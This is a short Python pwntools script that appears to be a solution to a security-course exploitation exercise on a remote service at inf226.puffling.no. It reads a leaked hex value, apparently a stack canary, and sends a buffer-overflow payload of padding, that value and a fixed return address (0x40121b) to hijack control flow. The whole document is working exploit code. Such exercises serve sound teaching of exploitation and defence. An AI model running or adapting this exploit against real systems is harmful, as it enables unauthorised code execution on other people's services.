from pwn import *

io = remote('inf226.puffling.no', 7002)

io.sendline(b'24')

hint = io.recvline().decode().strip().split(' ')[-1]

payload = cyclic(24) + p64(int(hint, 16))+  cyclic(8) + p64(0x40121b)

io.send(payload)

io.shutdown('out')

print(io.readall())

